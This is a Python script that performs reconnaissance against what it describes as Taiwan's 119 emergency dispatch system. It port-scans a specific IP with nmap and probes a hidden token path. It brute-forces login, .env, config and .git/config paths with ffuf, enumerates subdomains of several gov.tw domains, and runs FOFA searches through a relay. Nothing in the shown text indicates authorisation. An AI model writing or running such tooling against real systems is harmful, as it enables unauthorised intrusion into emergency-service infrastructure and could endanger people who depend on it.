#!/usr/bin/env python3
"""
Carpet search for Taiwan 119 dispatch system login endpoints.
Phase 1: Port scanning on 107.173.248.139 (top 20000 TCP ports)
Phase 2: FOFA cyberspace search (via fofoapi.com relay)
Phase 3: Directory brute force on discovered web ports
Phase 4: Subdomain enumeration for gov.tw domains
"""
import subprocess
import socket
import requests
import json
import base64
import urllib.parse
import time
import sys
import os

VERIFY = True  # verify=False for self-signed certs in gov systems

TARGET_IP = "107.173.248.139"
TARGET_PATH = "/dicl79nhrtolm07vqxk03fcqjyt4nvxu"
FOFA_BASE = "https://fofoapi.com"

# Government subdomain dictionary from skills
GOV_SUBDOMAINS = [
    "www", "service", "api", "intranet", "extranet", "portal", "apps", "login", "auth",
    "fire", "dispatch", "emergency", "realtime", "fdkc", "service119", "119dts", "ohca",
    "ambulance", "tpertc", "epcr", "hospital", "doctor", "mer", "mci", "monitor",
    "iserver", "eip", "oa", "mail", "smtp", "dns", "ns", "mx", "dev", "test", "staging",
    "uat", "demo", "cdn", "static", "img", "media", "old", "new", "backup", "api",
    "ws", "socket", "stream", "video", "health", "status", "admin", "console",
]

LOGIN_PATHS = [
    "login", "login.php", "login.jsp", "Login", "dologin",
    "auth", "auth/login", "api/auth", "api/login", "jwt/login",
    "admin/login", "admin/login.php", "admin/index.php",
    "user/login", "citizen/auth/genToken", "citizenCase/caseList",
    "genToken", "getUserToken", "fetchServerData",
    "swagger", "docs", "api-docs", "v1/auth", "v2/auth",
    "oauth/token", "oauth2/token", "api/token", "token",
    ".env", "config", "config.php", "config.json",
    "robots.txt", "favicon.ico", ".git/config",
]

def nmap_scan(target, port_range="1-20000", extra_flags=None):
    """Run nmap scan and return open ports."""
    cmd = ["nmap", "-Pn", "-sV", "--version-intensity", "3",
           "-p", port_range, "--host-timeout", "60s"]
    if extra_flags:
        cmd.extend(extra_flags)
    cmd.append(target)
    print(f"[*] Running: {' '.join(cmd)}")
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
    return result.stdout

def port_check(ip, port, timeout=3):
    """Quick TCP connect check for a single port."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        result = s.connect_ex((ip, port))
        s.close()
        return result == 0
    except:
        return False

def http_probe(url, timeout=10):
    """Probe a URL and return status code, size, title."""
    try:
        r = requests.get(url, timeout=timeout, verify=VERIFY,
                        allow_redirects=False,
                        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
        title = ""
        if r.headers.get("content-type", "").startswith("text/html"):
            import re
            t = re.search(r"<title>(.*?)</title>", r.text, re.DOTALL | re.IGNORECASE)
            if t:
                title = t.group(1).strip()
        server = r.headers.get("server", "")
        return {
            "status": r.status_code,
            "size": len(r.content),
            "title": title,
            "server": server,
            "headers": dict(r.headers),
            "body_preview": r.text[:500] if r.status_code == 200 else ""
        }
    except Exception as e:
        return {"error": str(e)}

def ffuf_scan(base_url, wordlist, extra_paths=None):
    """Run ffuf directory brute force."""
    wordlist_path = "/tmp/fuzz_wordlist.txt"
    all_paths = wordlist + (extra_paths or [])
    with open(wordlist_path, "w") as f:
        for p in all_paths:
            f.write(p + "\n")
    
    cmd = ["ffuf", "-w", wordlist_path, "-u", base_url + "/FUZZ",
           "-mc", "200,301,302,307,400,401,403,404,500,502",
           "-t", "50", "-s", "--timeout", "10", "-of", "json"]
    
    print(f"[*] Running ffuf on {base_url}")
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
    findings = []
    for line in result.stdout.strip().split("\n"):
        if line.strip():
            try:
                findings.append(json.loads(line))
            except:
                pass
    return findings

def fofa_search(query, fofa_base=FOFA_BASE):
    """Search FOFA via its API."""
    enc = base64.b64encode(query.encode()).decode()
    
    # Try the fofoapi.com relay endpoint
    urls = [
        f"{fofa_base}/api/v1/search/all?qbase64={enc}",
        f"{fofa_base}/api/v1/search/all?q={urllib.parse.quote(query)}",
    ]
    
    for url in urls:
        try:
            r = requests.get(url, timeout=15, verify=VERIFY,
                           headers={"User-Agent": "Mozilla/5.0"})
            if r.status_code == 200:
                data = r.json()
                if not data.get("error"):
                    return data
                else:
                    print(f"  FOFA error: {data.get('errmsg', data.get('message', ''))}")
            else:
                print(f"  FOFA HTTP {r.status_code}: {r.text[:200]}")
        except Exception as e:
            print(f"  FOFA error: {e}")
    
    return None

def main():
    results = {}
    
    # ===== Phase 1: Port scanning =====
    print("=" * 60)
    print("PHASE 1: Port Scanning")
    print("=" * 60)
    
    # First, quick check of known ports
    important_ports = [80, 443, 18888, 18999, 8443, 8080, 8000, 3000, 
                       5000, 7000, 8888, 9000, 10000]
    print(f"[*] Quick port check on {TARGET_IP}")
    open_ports = []
    for port in important_ports:
        if port_check(TARGET_IP, port, timeout=3):
            print(f"  [+] Port {port} is OPEN")
            open_ports.append(port)
    
    # Full scan with nmap
    print(f"\n[*] Full nmap scan on {TARGET_IP} (ports 1-20000)")
    nmap_result = nmap_scan(TARGET_IP, port_range="1-20000")
    print(nmap_result[:3000])
    
    # Parse nmap output for open ports
    import re
    nmap_ports = re.findall(r"(\d+)/tcp\s+open\s+(\S+)", nmap_result)
    results["open_ports"] = nmap_ports
    print(f"\n[*] Open ports from nmap: {nmap_ports}")
    
    # Merge with quick check results (convert to int)
    all_open = set(int(p) for p, _ in nmap_ports) | set(open_ports)
    
    # ===== Phase 2: HTTP probing on open ports =====
    print("\n" + "=" * 60)
    print("PHASE 2: HTTP Probing")
    print("=" * 60)
    
    protocols = ["http", "https"]
    http_results = {}
    for port in sorted(all_open):
        for proto in protocols:
            url = f"{proto}://{TARGET_IP}:{port}/"
            probe = http_probe(url)
            if "error" not in probe:
                key = f"{proto}://{TARGET_IP}:{port}"
                http_results[key] = probe
                print(f"  [{proto}] {TARGET_IP}:{port} -> HTTP {probe['status']} | {probe['size']} bytes | Server: {probe['server']} | Title: {probe['title']}")
                
                # Also try the token path
                if proto == "http" and port == 18999:
                    token_url = f"{proto}://{TARGET_IP}:{port}{TARGET_PATH}"
                    tp = http_probe(token_url)
                    print(f"  [token path] {token_url} -> HTTP {tp.get('status', 'ERR')} | {tp.get('size', 0)} bytes")
    
    results["http_results"] = http_results
    
    # ===== Phase 3: Directory brute force on web ports =====
    print("\n" + "=" * 60)
    print("PHASE 3: Directory Brute Force")
    print("=" * 60)
    
    dir_results = {}
    web_ports = [80, 443, 18999]
    for port in web_ports:
        if port in all_open:
            for proto in ["http", "https"]:
                base = f"{proto}://{TARGET_IP}:{port}"
                # Check if base is accessible
                probe = http_probe(base, timeout=5)
                if "error" in probe:
                    continue
                print(f"\n[*] Brute forcing {base}")
                # Use ffuf
                findings = ffuf_scan(base, LOGIN_PATHS)
                if findings:
                    dir_results[f"{proto}://{TARGET_IP}:{port}"] = findings
                    for f in findings:
                        print(f"  [+] {proto}://{TARGET_IP}:{port}{f.get('url', '')} -> HTTP {f.get('status', '?')}")
    
    results["directory_findings"] = dir_results
    
    # Also brute force common subdomains
    print("\n" + "=" * 60)
    print("PHASE 4: Subdomain Brute Force")
    print("=" * 60)
    
    domains = ["tfd.gov.tw", "tpf.gov.tw", "twd.gov.tw"]
    subdomain_results = {}
    for domain in domains:
        print(f"\n[*] Brute forcing subdomains of {domain}")
        found = []
        for sub in GOV_SUBDOMAINS:
            fqdn = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(fqdn)
                found.append((fqdn, ip))
                print(f"  [+] {fqdn} -> {ip}")
            except socket.gaierror:
                pass
        subdomain_results[domain] = found
    
    results["subdomains"] = subdomain_results
    
    # ===== Phase 5: FOFA search =====
    print("\n" + "=" * 60)
    print("PHASE 5: FOFA Cyberspace Search")
    print("=" * 60)
    
    fofa_queries = [
        "service119.tfd.gov.tw",
        "app.tfd.gov.tw",
        "portal.tfd.gov.tw",
        "119 \"login\" site:tfd.gov.tw",
        "epcr.tpf.gov.tw",
        "tpertc",
        "\"台北 119\" \"登入\"",
    ]
    
    fofa_results = {}
    for q in fofa_queries:
        print(f"\n[*] FOFA query: {q}")
        result = fofa_search(q)
        if result:
            fofa_results[q] = result
            results_list = result.get("results", result.get("data", result.get("results_list", [])))
            print(f"  Found {len(results_list)} results")
            for r in results_list[:5]:
                host = r.get("host", r.get("ip", ""))
                print(f"  - {host}")
        else:
            print(f"  No results (may require FOFA API key)")
    
    results["fofa_results"] = fofa_results
    
    # ===== Summary =====
    print("\n" + "=" * 60)
    print("SUMMARY")
    print("=" * 60)
    print(f"Open ports: {sorted(all_open)}")
    print(f"HTTP endpoints found: {len(http_results)}")
    print(f"Subdomains found: {sum(len(v) for v in subdomain_results.values())}")
    print(f"FOFA results: {len(fofa_results)} queries with results")
    
    # Save results
    output_file = f"/mnt/c/Users/Administrator/desktop/JySecAI/tpe119_evidence/carpet_search_results_{int(time.time())}.json"
    with open(output_file, "w") as f:
        json.dump(results, f, indent=2, default=str, ensure_ascii=False)
    print(f"\n[*] Results saved to: {output_file}")
    
    # Also save raw nmap output
    nmap_file = f"/mnt/c/Users/Administrator/desktop/JySecAI/tpe119_evidence/nmap_raw_{int(time.time())}.txt"
    with open(nmap_file, "w") as f:
        f.write(nmap_result)
    print(f"[*] Nmap output saved to: {nmap_file}")

if __name__ == "__main__":
    main()
